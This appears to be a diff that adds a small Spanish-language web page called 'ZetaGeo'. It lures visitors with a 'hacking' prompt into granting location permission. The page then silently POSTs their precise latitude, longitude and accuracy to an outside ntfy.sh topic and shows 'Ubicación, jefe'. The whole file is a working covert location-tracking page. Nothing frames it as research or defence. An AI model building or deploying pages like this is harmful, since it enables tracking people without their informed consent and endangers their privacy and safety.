@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es-Zeta">
+<head>
+  <meta charset="UTF-8">
+  <title>ZetaGeo</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #msg {
+      font-size: 1.5rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div id="msg">Aceptar permiso para empezar a hackear 🚀</div>
+
+  <script>
+    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999"; // Cambia esto por tu tema privado
+
+    function mandaUbicacion(pos) {
+      const { latitude, longitude, accuracy } = pos.coords;
+      const payload = {
+        lat: latitude,
+        lon: longitude,
+        acc: accuracy,
+        ts: new Date().toISOString()
+      };
+      fetch(ntfyUrl, {
+        method: "POST",
+        body: JSON.stringify(payload, null, 2),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(() => {
+        document.getElementById("msg").innerText = "Ubicación, jefe 👽";
+      })
+      .catch(err => {
+        document.getElementById("msg").innerText = "Error al enviar: " + err;
+      });
+    }
+
+    function errorHandler(err) {
+      document.getElementById("msg").innerText = "Fallo al obtener ubicación: " + err.message;
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(mandaUbicacion, errorHandler, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    } else {
+      document.getElementById("msg").innerText = "Geolocalización no soportada 💀";
+    }
+  </script>
+</body>
+</html>
